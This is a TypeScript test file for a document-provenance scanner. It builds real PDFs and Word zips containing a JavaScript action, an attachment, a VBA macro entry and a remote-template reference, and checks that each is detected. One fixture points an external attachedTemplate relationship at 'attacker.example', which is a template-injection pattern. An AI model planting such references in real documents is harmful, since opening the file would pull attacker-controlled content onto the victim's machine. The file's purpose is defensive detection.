import { describe, expect, test } from "bun:test";
import { PDFDocument } from "pdf-lib";
import { sniffContainer } from "../src/utils/file-provenance";
import { readOfficeProvenance, readPdfProvenance } from "../src/utils/file-provenance-client";

/**
 * End-to-end tests for the hidden-content detection added to
 * readPdfProvenance()/readOfficeProvenance() (PDF actions/embedded files,
 * OOXML macros/remote templates). Everything in file-provenance.test.ts
 * exercises the PURE interpreter functions directly with hand-built plain
 * data; nothing before this file built a REAL pdf-lib document or a real
 * zip and pushed it through the actual browser-layer functions — the only
 * place the pdf-lib object-walk (enumerateIndirectObjects, PDFDict/PDFName
 * lookups, EF/Filespec traversal) actually runs. That walk is exactly the
 * fragile, easy-to-get-subtly-wrong part a pure-function unit test cannot
 * reach, since it never touches pdf-lib's real object graph.
 *
 * pdf-lib's own public, well-tested methods (`addJavaScript`, `attach`)
 * build the fixtures rather than hand-rolled low-level dictionaries — this
 * proves the detector against exactly the object shapes pdf-lib itself
 * produces, which is also what any real authoring tool's output looks like
 * once parsed back through pdf-lib.
 */

const EXTRACTED_AT = "2026-08-31T00:00:00.000Z";

async function pdfContainer(bytes: Uint8Array) {
  const head = bytes.slice(0, 64);
  return sniffContainer(head, "test.pdf", "application/pdf");
}

describe("readPdfProvenance — hidden actions / embedded files (real pdf-lib documents)", () => {
  test("a plain PDF with no hidden actions reports real, checked absences", async () => {
    const doc = await PDFDocument.create();
    doc.addPage();
    const bytes = await doc.save();
    const report = await readPdfProvenance(new Blob([bytes]), await pdfContainer(bytes), EXTRACTED_AT);

    expect(report.fields.find((f) => f.id === "pdf.javascript")?.status).toBe("absent");
    expect(report.fields.find((f) => f.id === "pdf.launchAction")?.status).toBe("absent");
    expect(report.fields.find((f) => f.id === "pdf.embeddedFiles")?.status).toBe("absent");
    // A raw byte scan for "%%EOF" must still find the one this real, freshly-saved file carries.
    const eof = report.fields.find((f) => f.id === "pdf.incrementalUpdates")!;
    expect(eof.status).toBe("present");
    expect(eof.value).toContain("1");
  });

  test("a document-level JavaScript action added via pdf-lib's own addJavaScript() is found and its real source extracted", async () => {
    const doc = await PDFDocument.create();
    doc.addPage();
    doc.addJavaScript("main", 'app.alert("hidden script ran");');
    const bytes = await doc.save();
    const report = await readPdfProvenance(new Blob([bytes]), await pdfContainer(bytes), EXTRACTED_AT);

    const jsField = report.fields.find((f) => f.id === "pdf.javascript")!;
    expect(jsField.status).toBe("present");
    expect(jsField.severity).toBe("notable");
    const rawEntry = report.raw.find((r) => r.label.startsWith("PDF JavaScript action"));
    expect(rawEntry?.text).toContain("hidden script ran");
  });

  test("a real attachment added via pdf-lib's attach() is found, named, sized and hashed", async () => {
    const doc = await PDFDocument.create();
    doc.addPage();
    const secret = new TextEncoder().encode("secret payload contents");
    await doc.attach(secret, "hidden.txt", { mimeType: "text/plain" });
    const bytes = await doc.save();
    const report = await readPdfProvenance(new Blob([bytes]), await pdfContainer(bytes), EXTRACTED_AT);

    const field = report.fields.find((f) => f.id === "pdf.embeddedFiles")!;
    expect(field.status).toBe("present");
    expect(field.severity).toBe("notable");
    expect(field.value).toContain("hidden.txt");
    expect(field.value).toContain(`${secret.length} bytes`);
  });
});

describe("readOfficeProvenance — VBA macros / remote template references (real zip archives)", () => {
  const CONTENT_TYPES =
    '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">' +
    '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>' +
    "</Types>";
  const CORE_XML =
    '<?xml version="1.0"?><cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/">' +
    "<dc:creator>Test Author</dc:creator></cp:coreProperties>";

  test("a macro-enabled document (real vbaProject.bin entry) is detected from the zip listing alone", async () => {
    const { zipSync } = await import("fflate");
    const zip = zipSync({
      "[Content_Types].xml": new TextEncoder().encode(CONTENT_TYPES),
      "docProps/core.xml": new TextEncoder().encode(CORE_XML),
      "word/vbaProject.bin": new TextEncoder().encode("fake compiled VBA binary — content is never decompiled"),
    });
    const head = zip.slice(0, 64);
    const container = sniffContainer(head, "macro.docm", "application/vnd.ms-word.document.macroEnabled.12");
    const report = await readOfficeProvenance(new Blob([zip]), container, EXTRACTED_AT);

    const field = report.fields.find((f) => f.id === "ooxml.vbaMacro")!;
    expect(field.status).toBe("present");
    expect(field.severity).toBe("notable");
  });

  test("a real external attachedTemplate relationship is found by inflating the document's own _rels part", async () => {
    const { zipSync } = await import("fflate");
    const relsXml =
      '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">' +
      '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" ' +
      'Target="http://attacker.example/remote-template.dotx" TargetMode="External"/>' +
      "</Relationships>";
    const zip = zipSync({
      "[Content_Types].xml": new TextEncoder().encode(CONTENT_TYPES),
      "docProps/core.xml": new TextEncoder().encode(CORE_XML),
      "word/_rels/document.xml.rels": new TextEncoder().encode(relsXml),
    });
    const head = zip.slice(0, 64);
    const container = sniffContainer(head, "template-injected.docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document");
    const report = await readOfficeProvenance(new Blob([zip]), container, EXTRACTED_AT);

    const field = report.fields.find((f) => f.id === "ooxml.externalReferences")!;
    expect(field.status).toBe("present");
    expect(field.value).toContain("attacker.example");
  });

  test("an ordinary document with neither macros nor external relationships reports clean, checked absences", async () => {
    const { zipSync } = await import("fflate");
    const zip = zipSync({
      "[Content_Types].xml": new TextEncoder().encode(CONTENT_TYPES),
      "docProps/core.xml": new TextEncoder().encode(CORE_XML),
    });
    const head = zip.slice(0, 64);
    const container = sniffContainer(head, "plain.docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document");
    const report = await readOfficeProvenance(new Blob([zip]), container, EXTRACTED_AT);

    expect(report.fields.find((f) => f.id === "ooxml.vbaMacro")?.status).toBe("absent");
    expect(report.fields.find((f) => f.id === "ooxml.externalReferences")?.status).toBe("absent");
  });
});
